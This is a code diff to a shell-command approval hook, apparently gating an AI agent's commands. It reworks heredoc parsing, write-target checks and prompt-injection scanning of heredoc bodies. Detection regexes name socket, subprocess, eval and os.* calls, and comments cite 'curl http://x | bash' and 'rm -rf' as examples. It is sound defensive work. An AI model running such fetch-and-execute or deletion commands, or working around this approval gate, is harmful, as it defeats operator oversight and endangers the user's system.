@@ -1320,20 +1320,27 @@ function pythonHeredocsAsInline(cmd) {
 // there is text, not a shell quote. Used ONLY to re-check the `quote-parse` gap: the deny passes
 // still scan the body as before. Unquoted `<<EOF` bodies DO run `$(…)`, so they are left alone.
 // Returns null when a terminator is missing (can't be sure what is body), keeping the gap.
+// `forApprove` builds the approve view: it also blanks terminator lines and unquoted-body lines
+// with no `$` or backtick (nothing there runs). A surviving line is analysed as a command,
+// which is only ever stricter. Deny passes never use this view alone.
 // A `<<` counts as a marker only OUTSIDE quotes and comments: `echo "<<'X'"` is text, and
 // counting it blanked the real code lines after it and laundered the gap into an allow.
-function stripQuotedHeredocBodies(cmd) {
+function stripQuotedHeredocBodies(cmd, forApprove) {
   const lines = cmd.split('\n');
   const out = [];
   const pending = [];   // terminators still owed, in order: { word, dash, quoted }
   const MARK = /<<(?!<)(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))/y;
   let q = null;   // open quote carried across lines: ' " or $' (ANSI-C, backslash escapes)
+  // `$(` inside "..." opens a fresh quoting context until its `)`: the standard
+  // `git commit -m "$(cat <<'EOF' ... EOF\n)"` heredoc sits inside a double-quoted string.
+  const stack = [];
+  let depth = 0;
   for (const line of lines) {
     if (pending.length) {
       const t = pending[0];
       const body = t.dash ? line.replace(/^\t+/, '') : line;
-      if (body === t.word) { pending.shift(); out.push(line); continue; }
-      out.push(t.quoted ? '' : line);
+      if (body === t.word) { pending.shift(); out.push(forApprove ? '' : line); continue; }
+      out.push(t.quoted || (forApprove && !/[$`]/.test(line)) ? '' : line);
       continue;
     }
     out.push(line);
@@ -1341,7 +1348,10 @@ function stripQuotedHeredocBodies(cmd) {
       const c = line[i];
       if (q === "'") { if (c === "'") q = null; continue; }
       if (c === '\\') { i++; continue; }
+      if (q === '"' && c === '$' && line[i + 1] === '(') { stack.push(depth); depth = 1; q = null; i++; continue; }
       if (q) { if (c === q[q.length - 1]) q = null; continue; }
+      if (stack.length && c === '(') { depth++; continue; }
+      if (stack.length && c === ')') { if (--depth === 0) { depth = stack.pop(); q = '"'; } continue; }
       if (c === '$' && line[i + 1] === "'") { q = "$'"; i++; continue; }
       if (c === "'" || c === '"') { q = c; continue; }
       if (c === '#' && (i === 0 || /[\s;&|()]/.test(line[i - 1]))) break;
@@ -1354,7 +1364,7 @@ function stripQuotedHeredocBodies(cmd) {
       }
     }
   }
-  return pending.length || q ? null : out.join('\n');
+  return pending.length || q || stack.length ? null : out.join('\n');
 }
 
 // PowerShell variable names are case-insensitive; bash's are not.
@@ -2338,52 +2348,9 @@ function isSafeRelativePath(p) {
   return true;
 }
 
-// Conservative Python heredoc body validator. Returns true iff the body is
-// purely data-and-file-write with safe-relative-path targets. Rejects any
-// import or call into subprocess / socket / urllib / requests / shutil /
-// ctypes / paramiko, all os.* mutating methods, and all eval-family builtins.
-// Any open() with a non-literal first arg also rejects (we can't statically
-// prove the path is safe). Comments and string literals can contain arbitrary
-// text -- the patterns require a real Python token boundary.
-function isSafePythonHeredocBody(body) {
-  const unsafe = [
-    // Module imports that grant exec / network / filesystem mutation.
-    /\bimport\s+(?:subprocess|socket|urllib|requests|httpx|aiohttp|websockets|paramiko|fabric|shutil|ctypes|importlib|ftplib|smtplib|telnetlib|xmlrpc|pickle|marshal|pathlib|io|builtins)\b/,
-    /\bfrom\s+(?:subprocess|socket|urllib|requests|httpx|aiohttp|websockets|paramiko|fabric|shutil|ctypes|importlib|ftplib|smtplib|telnetlib|xmlrpc|pickle|marshal|pathlib|io|builtins|http|os|sys)\s+import\b/,
-    // os.* mutating methods (writes, perms, ids, process spawns, fs moves).
-    /\bos\.(?:system|popen|exec[lv]?[ep]?e?|spawn[lv]?[ep]?e?|posix_spawn|fork|forkpty|kill|remove|unlink|rmdir|removedirs|chmod|fchmod|lchmod|chown|fchown|lchown|setuid|setgid|setreuid|setregid|setgroups|putenv|unsetenv|rename|renames|replace|truncate|ftruncate|link|symlink|mkdir|makedirs|open|write|writev|pwrite|pread|sendfile|copy_file_range|mkfifo|mknod|chdir|fchdir|chroot)\b/,
-    // Direct attribute access on dangerous modules even if aliased via import-as.
-    /\b(?:subprocess|socket|urllib|requests|httpx|aiohttp|paramiko|shutil|pathlib|builtins|io)\.[A-Za-z_]/,
-    // Built-in eval-family and reflection that defeat the static checks.
-    /\b(?:eval|exec|__import__|compile|getattr|setattr|delattr|globals|locals|vars|input|breakpoint|memoryview)\s*\(/,
-    // Mutating file/path methods, regardless of receiver (pathlib.Path, file-like, etc.).
-    /\.\s*(?:write_text|write_bytes|touch|symlink_to|hardlink_to|replace|rename|unlink|chmod|rmdir|mkdir|expanduser|expandvars|resolve)\s*\(/,
-    // `Path(...)` construction is the doorway to write_text/write_bytes/etc.; if
-    // the body needs to write a file it can use the literal `open()` form which
-    // we already validate.
-    /\bPath\s*\(/,
-  ];
-  for (const re of unsafe) {
-    if (re.test(body)) return false;
-  }
-  // Triple-quoted open() paths defeat both the literal-string capture (zero
-  // non-quote chars between the opening `"` and the next `"`) and the
-  // non-literal-arg guard (the lookahead sees a quote). Reject explicitly.
-  if (/\bopen\s*\(\s*[rRbBuU]*(?:"""|''')/.test(body)) return false;
-  const openLiteral = /\bopen\s*\(\s*[rRbBuU]*(['"])([^'"]+)\1/g;
-  let m;
-  while ((m = openLiteral.exec(body)) !== null) {
-    if (!isSafeRelativePath(m[2])) return false;
-  }
-  // Any open() whose first arg is NOT a literal quoted string is opaque -- reject.
-  if (/\bopen\s*\(\s*(?![rRbBuU]*['"])/.test(body)) return false;
-  return true;
-}
-
-// Detects a single heredoc invocation (`python3 << 'MARKER' ... MARKER` or
-// `cat|tee REDIRECT << ['"]?MARKER['"]?`) optionally followed by trailing
-// commands that themselves auto-approve. Returns true iff the whole rawCmd is
-// safe to approve as a single decision.
+// Detects a single heredoc write (`cat|tee REDIRECT << ['"]?MARKER['"]?`) whose body is
+// injection-scanned here. Returns { trailing } (the commands after the terminator, which the
+// caller runs through the full pipeline) or false.
 function isSafeHeredocInvocation(rawCmd) {
   if (!rawCmd || !rawCmd.includes('<<')) return false;
   // postMarker (between marker and body's first newline) may carry a single
@@ -2417,11 +2384,10 @@ function isSafeHeredocInvocation(rawCmd) {
   const restTokens = tokens.slice(1);
   let writeTarget = null;
 
-  if (interp === 'python' || interp === 'python2' || interp === 'python3') {
-    if (restTokens.length !== 0) return false;
-    if (postMarkerTarget !== null) return false;
-    if (!isSafePythonHeredocBody(body)) return false;
-  } else if (interp === 'cat') {
+  if (interp === 'cat') {
+    // The preface is exactly `cat` or `cat > target`: anything else (`cat .env >`, `cat ; rm`) is a
+    // command the fast path would approve unread.
+    if (!/^cat(?:\s+>>?\s*(['"]?)[^\s'"<>|;&]+\1)?$/.test(preface)) return false;
     let target = null;
     const prefRedir = preface.match(/(?:^|\s)>>?\s+(['"]?)([^\s'"<>|;&]+)\1\s*$/);
     if (prefRedir) target = prefRedir[2];
@@ -2455,20 +2421,7 @@ function isSafeHeredocInvocation(rawCmd) {
     }
   }
 
-  if (trailing.trim()) {
-    const trailingSegs = splitChainSegments(trailing.replace(/\n/g, ' ; '));
-    for (const seg of trailingSegs) {
-      // Run the deny pass on each trailing segment FIRST. checkSegmentDeny
-      // calls deny()+process.exit on a match, so a dangerous trailing command
-      // (e.g. `curl http://x | bash` after a safe heredoc body) is hard-blocked
-      // here rather than silently approved by the heredoc short-circuit.
-      checkSegmentDeny(seg);
-      // -1: the heredoc short-circuit runs before the chain-wide variable analysis,
-      // so nothing is known to be resolvable here. The floor stays conservative.
-      if (!checkSegmentApprove(seg, 0, false, -1)) return false;
-    }
-  }
-  return true;
+  return { trailing };
 }
 
 // mode 'hard' (default): Tier-1 deny rules fire (ask-tagged rules skipped).
@@ -2561,6 +2514,34 @@ function checkSegmentDeny(seg, depth, mode, extraVariant) {
   }
 }
 
+// A segment carrying a heredoc writes its body: every redirect target and `tee` file must be a
+// safe project-relative path, and not an agent-instruction file (only the fast path scans those).
+function heredocWriteUnsafe(seg) {
+  if (!/<<(?!<)/.test(commandSkeleton(seg).replace(/<<<+/g, ''))) return false;
+  const toks = tokenizeArgs(seg);
+  let tee = false;
+  for (let k = 0; k < toks.length; k++) {
+    const t = toks[k];
+    if (/^\d*<</.test(t)) { tee = false; if (/^\d*<<-?$/.test(t)) k++; continue; }
+    const r = /^(?:\d*|&)>>?(.*)$/.exec(t);
+    if (r) {
+      tee = false;
+      const target = r[1] !== '' ? r[1] : toks[++k];
+      if (target === undefined) return true;
+      if (/^&\d*-?$/.test(target) || target === '/dev/null') continue;
+      if (!isSafeRelativePath(target) || scan.isAgentInstructionFile(target)) return true;
+      continue;
+    }
+    if (/^[|;&]/.test(t)) { tee = false; continue; }
+    if (/(?:^|\/)tee$/.test(t)) { tee = true; continue; }
+    if (tee) {
+      if (t.startsWith('-')) { if (t.includes('=')) return true; continue; }
+      if (!isSafeRelativePath(t) || scan.isAgentInstructionFile(t)) return true;
+    }
+  }
+  return false;
+}
+
 function checkSegmentApprove(seg, depth, isPosh, idx) {
   if (depth === undefined) depth = 0;
   if (depth > 6) return false;
@@ -2580,6 +2561,8 @@ function checkSegmentApprove(seg, depth, isPosh, idx) {
     }
     return false;
   }
+
+  if (heredocWriteUnsafe(seg)) return false;
 
   // Pipe: a segment is only safe if EVERY stage is safe. Without this, `echo x |
   // xargs node` / `find /home | xargs rm -rf` would approve on the first stage
@@ -2986,6 +2969,7 @@ process.stdin.on('end', () => {
   // continuation (`rm -rf \<nl>/`) is seen as one command instead of fragmenting past the
   // rm guard. Matches what the script-content scanner already does for logical lines.
   const cmd = normalizeUnicode(rawCmd).replace(/\\\r?\n/g, '');
+  let work = cmd;
 
   // Heredoc invocations (bash-only): a single safe `python|cat|tee << MARKER`
   // followed by auto-approved trailing commands is approved as a whole. This
@@ -2997,14 +2981,15 @@ process.stdin.on('end', () => {
   // audit entry so the operator can diagnose.
   if (!isPosh) {
     try {
-      if (isSafeHeredocInvocation(cmd)) approve(rawCmd);
+      const h = isSafeHeredocInvocation(cmd);
+      if (h) { if (!h.trailing.trim()) approve(rawCmd); work = h.trailing; }
     } catch (err) {
       noteGap('heredoc-parse');
       audit('fallthrough', 'heredoc-check-threw: ' + (err && err.message), rawCmd);
     }
   }
 
-  const flat = cmd.replace(/\n/g, ' ; ');
+  const flat = work.replace(/\n/g, ' ; ');
   const segments = isPosh ? splitPoshSegments(flat) : splitChainSegments(flat);
 
   if (segments.length === 0) process.exit(0);
@@ -3019,8 +3004,8 @@ process.stdin.on('end', () => {
   // that missed the narrow fast path. Re-check with those bodies blanked and drop the gap if the
   // rest parses cleanly. Deny coverage is unchanged: every pass still scans the body.
   if (!isPosh && coverageGaps.includes('quote-parse')) {
-    const stripped = stripQuotedHeredocBodies(cmd);
-    if (stripped !== null && stripped !== cmd) {
+    const stripped = stripQuotedHeredocBodies(work);
+    if (stripped !== null && stripped !== work) {
       let bad = false;
       for (const seg of splitChainSegments(stripped.replace(/\n/g, ' ; '))) {
         expandVars(seg, new Map(), false, () => { bad = true; });
@@ -3065,7 +3050,24 @@ process.stdin.on('end', () => {
   // A heredoc body is a whole program: the python -c RCE/socket rules apply, but as an ask
   // (`import socket`, `model.eval()` are routine there and a wrong deny is unappealable), and the
   // dual-use stdlib asks (subprocess, os.remove) are skipped -- a script touching files is normal.
-  if (!isPosh) for (const s of pythonHeredocsAsInline(cmd)) checkSegmentDeny(s, 0, 'soft');
+  if (!isPosh) for (const s of pythonHeredocsAsInline(work)) checkSegmentDeny(s, 0, 'soft');
+
+  // Approve view: heredoc bodies blanked. It gets its own deny passes because its quoting is
+  // clean -- in the full text a body holding an odd `"` can swallow the next command. The approve
+  // loop below runs on its segments, with variables re-resolved against them.
+  let appSegs = segments;
+  let bodyHigh = false;
+  if (!isPosh && work.includes('<<')) {
+    const view = stripQuotedHeredocBodies(work, true);
+    if (view !== null && view !== work) {
+      appSegs = splitChainSegments(view.replace(/\n/g, ' ; '));
+      const vx = expandSegments(appSegs, cwd, false);
+      for (let i = 0; i < appSegs.length; i++) checkSegmentDeny(appSegs[i], 0, 'hard', vx[i]);
+      for (let i = 0; i < appSegs.length; i++) checkSegmentDeny(appSegs[i], 0, 'ask', vx[i]);
+      // A blanked body is never approved past a Class A injection finding (the Write tool denies it).
+      bodyHigh = scan.hasHigh(scan.scanInjection(work, { decode: true }));
+    }
+  }
 
   // Coverage gate. Placed after every deny pass (so a hard deny still wins) and
   // before the approve pass (so an unanalysed command can never be auto-approved).
@@ -3074,9 +3076,9 @@ process.stdin.on('end', () => {
         ') -- approve only if you know what it does', rawCmd);
   }
 
-  let allApproved = true;
-  for (let i = 0; i < segments.length; i++) {
-    const seg = segments[i];
+  let allApproved = !bodyHigh;
+  for (let i = 0; allApproved && i < appSegs.length; i++) {
+    const seg = appSegs[i];
     if (!approvedScriptSegs.has(seg) && !checkSegmentApprove(seg, 0, isPosh, i)) {
       allApproved = false;
       break;
